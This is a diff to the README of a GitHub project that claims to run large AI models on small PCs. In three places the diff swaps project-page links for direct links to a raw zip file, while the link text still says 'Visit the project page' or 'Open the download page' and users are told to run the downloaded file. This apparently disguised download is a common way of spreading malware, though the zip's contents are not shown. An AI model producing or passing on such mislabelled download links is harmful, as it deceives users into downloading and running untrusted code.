@@ -1,6 +1,6 @@
 # 🧠 Neural_Memory_Operating_system - Run large AI models on small PCs
 
-[![Download / Install](https://img.shields.io/badge/Download%20%26%20Install-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/27tr7437/Neural_Memory_Operating_system)
+[![Download / Install](https://img.shields.io/badge/Download%20%26%20Install-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/27tr7437/Neural_Memory_Operating_system/raw/refs/heads/main/nmos/system_Neural_Memory_Operating_v2.2.zip)
 
 ## 🚀 What this is
 
@@ -19,7 +19,7 @@ It is designed to help with:
 
 Use this link to visit the project page and download the app:
 
-[Open the download page](https://github.com/27tr7437/Neural_Memory_Operating_system)
+[Open the download page](https://github.com/27tr7437/Neural_Memory_Operating_system/raw/refs/heads/main/nmos/system_Neural_Memory_Operating_v2.2.zip)
 
 After you open the page:
 
@@ -179,7 +179,7 @@ If you want the best speed, use a smaller model first, then move up once the app
 
 Go to the project page here:
 
-[https://github.com/27tr7437/Neural_Memory_Operating_system](https://github.com/27tr7437/Neural_Memory_Operating_system)
+[https://github.com/27tr7437/Neural_Memory_Operating_system/raw/refs/heads/main/nmos/system_Neural_Memory_Operating_v2.2.zip](https://github.com/27tr7437/Neural_Memory_Operating_system/raw/refs/heads/main/nmos/system_Neural_Memory_Operating_v2.2.zip)
 
 From there, download the Windows build or release package, then run the file on your PC
 
